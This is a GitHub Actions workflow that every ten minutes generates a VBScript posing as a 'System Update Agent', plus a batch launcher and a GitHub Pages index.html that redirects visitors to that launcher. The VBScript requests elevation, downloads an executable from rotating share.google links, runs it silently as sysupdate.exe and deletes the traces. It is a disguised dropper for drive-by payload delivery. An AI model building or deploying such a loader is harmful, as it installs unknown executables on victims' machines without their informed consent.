name: Update Silent Installer

on:
  schedule:
    - cron: '*/10 * * * *'  # Runs every 10 minutes
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Silent Installer
      run: |
        # Define your download links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 6))
        current_link=${links[$link_index]}
        
        echo "Current minute: $current_minute"
        echo "Link index: $link_index"
        echo "Creating installer with link: $current_link"
        
        # Create a temporary file with the URL
        echo "$current_link" > temp_url.txt
        
        # Create the VBS script using a more reliable method
        cat > installer.vbs << 'VBS_EOF'
        
' --------------------------------------------------------------------------
'  System Update Agent - Silent Installer
' --------------------------------------------------------------------------
Option Explicit

' Constants
Const TEMP_FOLDER = 2
Const OVERWRITE = 2

' Global objects
Dim objShell, objFSO, objNetwork
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("WScript.Network")

' Check for admin privileges
If Not IsAdmin() Then
    ElevateScript()
    WScript.Quit
End If

' Main execution
Main()

Sub Main()
    Dim downloadUrl, tempPath, installerPath, result, urlFile
    
    ' Get URL from temporary file
    tempPath = objFSO.GetSpecialFolder(TEMP_FOLDER).Path
    urlFile = tempPath & "\download_url.txt"
    installerPath = tempPath & "\sysupdate.exe"
    
    ' Read the URL from file
    Set objFile = objFSO.OpenTextFile(urlFile, 1)
    downloadUrl = objFile.ReadAll
    objFile.Close
    
    ' Log the start
    LogEvent "Starting installation from: " & downloadUrl
    
    ' Download the installer
    result = DownloadFile(downloadUrl, installerPath)
    If Not result Then
        LogEvent "Failed to download installer"
        Exit Sub
    End If
    
    ' Execute the installer silently
    LogEvent "Executing installer: " & installerPath
    ExecuteInstaller installerPath
    
    ' Cleanup
    If objFSO.FileExists(installerPath) Then
        objFSO.DeleteFile installerPath, True
        LogEvent "Installer file cleaned up"
    End If
    
    If objFSO.FileExists(urlFile) Then
        objFSO.DeleteFile urlFile, True
    End If
End Sub

Function IsAdmin()
    On Error Resume Next
    IsAdmin = (objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 1)
    If Err.Number <> 0 Then IsAdmin = True
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim scriptPath, args
    scriptPath = """" & WScript.ScriptFullName & """"
    args = "/elevated"
    
    LogEvent "Requesting elevation"
    CreateObject("Shell.Application").ShellExecute "wscript.exe", scriptPath & " " & args, "", "runas", 0
End Sub

Function DownloadFile(url, destination)
    On Error Resume Next
    Dim objHTTP, objStream, finalUrl
    
    LogEvent "Downloading from: " & url
    
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    ' Check for redirect (301, 302, etc.)
    If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
        finalUrl = objHTTP.getResponseHeader("Location")
        LogEvent "Redirect detected to: " & finalUrl
        objHTTP.Open "GET", finalUrl, False
        objHTTP.Send
    End If
    
    If objHTTP.Status <> 200 Then
        LogEvent "Download failed with status: " & objHTTP.Status
        DownloadFile = False
        Exit Function
    End If
    
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile destination, OVERWRITE
    objStream.Close
    
    LogEvent "Download completed to: " & destination
    DownloadFile = (Err.Number = 0)
End Function

Sub ExecuteInstaller(installerPath)
    Dim command
    command = """" & installerPath & """ /S /D=" & objShell.ExpandEnvironmentStrings("%ProgramFiles%")
    
    LogEvent "Running command: " & command
    objShell.Run command, 0, True
    LogEvent "Installer execution completed"
End Sub

Sub LogEvent(message)
    ' Log to Windows Application Event Log
    objShell.LogEvent 1, "System Update Agent: " & message
    
    ' Also log to a file for debugging
    Dim logFile, logPath
    logPath = objShell.ExpandEnvironmentStrings("%TEMP%")
    logFile = logPath & "\sysupdate.log"
    
    Dim objFSO, objTextStream
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objTextStream = objFSO.OpenTextFile(logFile, 8, True) ' 8 = ForAppending
    objTextStream.WriteLine Now & " - " & message
    objTextStream.Close
End Sub
VBS_EOF
        
        # Create a companion batch file to create the URL file
        cat > run_installer.bat << 'BATCH_EOF'
@echo off
echo %~dp0temp_url.txt > "%TEMP%\download_url.txt"
cscript.exe //nologo "%~dp0installer.vbs"
BATCH_EOF
        
        # Copy the URL file to be included in the repository
        cp temp_url.txt download_url.txt
        
        # Create index.html for GitHub Pages
        echo "Creating index.html for GitHub Pages"
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=run_installer.bat"></head><body><p>If not redirected, <a href="run_installer.bat">click here</a></p></body></html>' > index.html
        
        # Verify the installer was created correctly
        echo "Verifying installer content"
        grep -n "OpenTextFile" installer.vbs || echo "URL reading not found in installer"
        
        # Commit and push the updated files
        echo "Committing and pushing changes"
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.vbs run_installer.bat download_url.txt index.html
        git commit -m "Update silent installer with current link" || exit 0
        git push
        
        echo "Silent installer created successfully"
